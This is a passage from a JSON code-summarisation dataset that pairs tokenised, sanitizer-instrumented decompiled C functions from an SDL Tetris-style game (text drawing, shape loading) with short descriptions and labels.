            "(",
            "(",
            "(",
            "v4",
            "+",
            "288",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "288",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "288",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "288",
            ")",
            "=",
            "656",
            ";",
            "v11",
            "=",
            "218",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "292",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "-",
            "64",
            "+",
            "100",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "292",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "v11",
            "=",
            "v4",
            "+",
            "292",
            ";",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "292",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "292",
            ")",
            "=",
            "v11",
            ";",
            "v12",
            "=",
            "22",
            "*",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "296",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "296",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "296",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "296",
            ")",
            "=",
            "v12",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "300",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "-",
            "64",
            "+",
            "108",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "300",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "300",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "300",
            ")",
            "=",
            "48",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "Message_0",
            ",",
            "0L",
            "L",
            ",",
            "v4",
            "+",
            "288",
            ")",
            ";",
            "SDL_FreeSurface",
            "(",
            "surfaceMessage_0",
            ")",
            ";",
            "SDL_DestroyTexture",
            "(",
            "Message_0",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "type",
            "=",
            "=",
            "2",
            ")",
            "{",
            "memcpy",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ",",
            "\"Congrats! :)\"",
            ",",
            "0xDuL",
            "L",
            ")",
            ";",
            "surfaceMessage_1",
            "=",
            "(",
            "SDL_Surface_0",
            "*",
            ")",
            "TTF_RenderText_Solid",
            "(",
            "Font",
            ",",
            "v4",
            "+",
            "416",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "160",
            ")",
            ")",
            ";",
            "Message_1",
            "=",
            "(",
            "SDL_Texture_0",
            "*",
            ")",
            "SDL_CreateTextureFromSurface",
            "(",
            "rend",
            ",",
            "surfaceMessage_1",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "22",
            ",",
            "634",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2349E0",
            ",",
            "634L",
            "L",
            ",",
            "22L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "352",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "352",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "352",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "352",
            ")",
            "=",
            "656",
            ";",
            "v13",
            "=",
            "218",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "356",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "100",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "356",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "v13",
            "=",
            "v4",
            "+",
            "356",
            ";",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "356",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "356",
            ")",
            "=",
            "v13",
            ";",
            "v14",
            "=",
            "22",
            "*",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "416",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "360",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "360",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "360",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "360",
            ")",
            "=",
            "v14",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "364",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "108",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "364",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "364",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "364",
            ")",
            "=",
            "48",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "Message_1",
            ",",
            "0L",
            "L",
            ",",
            "v4",
            "+",
            "352",
            ")",
            ";",
            "SDL_FreeSurface",
            "(",
            "surfaceMessage_1",
            ")",
            ";",
            "SDL_DestroyTexture",
            "(",
            "Message_1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v24",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v4",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF80AC",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v6",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v6",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v6",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "180",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_5",
            "(",
            "v4",
            ",",
            "1440L",
            "L",
            ",",
            "v24",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"alloc\" is likely used to allocate memory for various data structures and resources within the code, including arenas, contexts, and other necessary components."
        ],
        "longer_label": "The code is a function that draws text using SDL and TTF, and also performs memory allocation and deallocation operations."
    },
    {
        "id": 232,
        "docstring_tokens": [
            "This",
            "code",
            "draws",
            "a",
            "``",
            "New",
            "Game",
            "''",
            "message",
            "on",
            "the",
            "screen",
            "using",
            "SDL",
            "and",
            "TTF",
            "libraries",
            "in",
            "C",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "TTF_Font",
            "*",
            "Font",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "_DWORD",
            "*",
            "v5",
            ";",
            "__int64",
            "TextureFromSurface",
            ";",
            "SDL_Surface_0",
            "*",
            "surfaceMessage",
            ";",
            "char",
            "v10",
            "[",
            "152",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v10",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v4",
            "=",
            "__asan_stack_malloc_1",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v3",
            "=",
            "v4",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 5 White 96 16 12 Message_rect \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "drawNewGame",
            ";",
            "v5",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v5",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v5",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v5",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v5",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "33",
            ")",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "34",
            ")",
            "=",
            "-",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "96",
            ")",
            "=",
            "700",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "100",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "100",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "100",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v3",
            "+",
            "100",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "100",
            ")",
            "=",
            "350",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "104",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "104",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v3",
            "+",
            "104",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "104",
            ")",
            "=",
            "200",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "108",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "108",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v3",
            "+",
            "108",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v3",
            "+",
            "108",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "108",
            ")",
            "=",
            "70",
            ";",
            "surfaceMessage",
            "=",
            "(",
            "SDL_Surface_0",
            "*",
            ")",
            "TTF_RenderText_Solid",
            "(",
            "Font",
            ",",
            "\"New Game\"",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ")",
            ";",
            "TextureFromSurface",
            "=",
            "SDL_CreateTextureFromSurface",
            "(",
            "rend",
            ",",
            "surfaceMessage",
            ")",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "TextureFromSurface",
            ",",
            "0L",
            "L",
            ",",
            "v3",
            "+",
            "96",
            ")",
            ";",
            "SDL_FreeSurface",
            "(",
            "surfaceMessage",
            ")",
            ";",
            "SDL_DestroyTexture",
            "(",
            "TextureFromSurface",
            ")",
            ";",
            "if",
            "(",
            "v10",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function is used to define and manipulate the stack data structure for various purposes such as storing and accessing function information, managing runtime environment, or implementing data structures like binary search trees.",
            "The \"malloc\" function is used to allocate memory dynamically for storing variables or data structures in the C programming language."
        ],
        "longer_label": "The given code is a function that creates a new game display using SDL and TTF libraries, while also demonstrating the use of the stack and dynamic memory allocation in C programming."
    },
    {
        "id": 233,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "shape",
            "data",
            "from",
            "a",
            "file",
            "and",
            "stores",
            "it",
            "in",
            "a",
            "3D",
            "array",
            "of",
            "cells",
            ",",
            "with",
            "each",
            "cell",
            "having",
            "color",
            "and",
            "state",
            "information",
            ",",
            "then",
            "returns",
            "the",
            "total",
            "number",
            "of",
            "shapes",
            "loaded",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "cell_0",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "]",
            "[",
            "4",
            "]",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "_DWORD",
            "*",
            "v3",
            ";",
            "cell_0",
            "*",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "char",
            "v6",
            ";",
            "cell_0",
            "*",
            "v7",
            ";",
            "char",
            "v8",
            ";",
            "bool",
            "v9",
            ";",
            "char",
            "v10",
            ";",
            "cell_0",
            "*",
            "v11",
            ";",
            "cell_0",
            "*",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "cell_0",
            "*",
            "v15",
            ";",
            "char",
            "v16",
            ";",
            "bool",
            "v17",
            ";",
            "char",
            "v18",
            ";",
            "cell_0",
            "*",
            "v19",
            ";",
            "cell_0",
            "*",
            "v20",
            ";",
            "int",
            "v21",
            ";",
            "char",
            "v22",
            ";",
            "cell_0",
            "*",
            "v23",
            ";",
            "char",
            "v24",
            ";",
            "bool",
            "v25",
            ";",
            "char",
            "v26",
            ";",
            "cell_0",
            "*",
            "v27",
            ";",
            "cell_0",
            "*",
            "v28",
            ";",
            "int",
            "v29",
            ";",
            "char",
            "v30",
            ";",
            "cell_0",
            "*",
            "v31",
            ";",
            "char",
            "v32",
            ";",
            "bool",
            "v33",
            ";",
            "char",
            "v34",
            ";",
            "cell_0",
            "*",
            "v35",
            ";",
            "int",
            "result",
            ";",
            "_BOOL4",
            "v37",
            ";",
            "bool",
            "v38",
            ";",
            "_BOOL4",
            "v39",
            ";",
            "bool",
            "v40",
            ";",
            "_BOOL4",
            "v41",
            ";",
            "bool",
            "v42",
            ";",
            "_BOOL4",
            "v43",
            ";",
            "bool",
            "v44",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "int",
            "ja",
            ";",
            "int",
            "jb",
            ";",
            "int",
            "jc",
            ";",
            "FILE",
            "*",
            "f",
            ";",
            "char",
            "v52",
            "[",
            "408",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v53",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v52",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v2",
            "=",
            "__asan_stack_malloc_3",
            "(",
            "384L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "=",
            "\"6 32 4 1 n 96 4 2 l1 160 4 2 l2 224 4 2 l3 288 4 2 l4 352 12 1 c \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "16",
            ")",
            "=",
            "loadShapes",
            ";",
            "v3",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v3",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v3",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v3",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v3",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v3",
            "[",
            "536862724",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v3",
            "[",
            "536862725",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v3",
            "[",
            "536862726",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v3",
            "[",
            "536862727",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v3",
            "[",
            "536862728",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v3",
            "[",
            "536862729",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v3",
            "[",
            "536862730",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v3",
            "[",
            "536862731",
            "]",
            "=",
            "-",
            "219020288",
            ";",
            "v53",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "f",
            "=",
            "fopen",
            "(",
            "\"res/shapes.tet\"",
            ",",
            "\"r\"",
            ")",
            ";",
            "__isoc99_fscanf",
            "(",
            "f",
            ",",
            "\"%d\"",
            ",",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "i",
            ">",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ")",
            "break",
            ";",
            "__isoc99_fscanf",
            "(",
            "f",
            ",",
            "\"%d %d %d %d %d %d %d\"",
            ",",
            "v1",
            "+",
            "352",
            ",",
            "v1",
            "+",
            "356",
            ",",
            "v1",
            "+",
            "360",
            ",",
            "v1",
            "+",
            "96",
            ",",
            "v1",
            "+",
            "160",
            ",",
            "v1",
            "+",
            "224",
            ",",
            "v1",
            "+",
            "288",
            ")",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "j",
            ">",
            "0x1F",
            "|",
            "|",
            "1u",
            ">",
            ">",
            "(",
            "31",
            "-",
            "j",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_shift_out_of_bounds",
            "(",
            "&",
            "off_234A60",
            ",",
            "1L",
            "L",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ";",
            "v37",
            "=",
            "(",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ">",
            ">",
            "j",
            ")",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ";",
            "v4",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "v5",
            "=",
            "3",
            "-",
            "j",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "3",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_235060",
            ",",
            "3L",
            "L",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v5",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234B60",
            ",",
            "v5",
            ")",
            ";",
            "v38",
            "=",
            "v37",
            ";",
            "if",
            "(",
            "!",
            "v4",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234BA0",
            ",",
            "v4",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v4",
            "[",
            "v5",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "v5",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v6",
            ")",
            "__asan_report_store1",
            "(",
            "&",
            "v4",
            "[",
            "v5",
            "]",
            ")",
            ";",
            "v4",
            "[",
            "v5",
            "]",
            ".",
            "state",
            "=",
            "v38",
            ";",
            "v7",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234C00",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v7",
            "|",
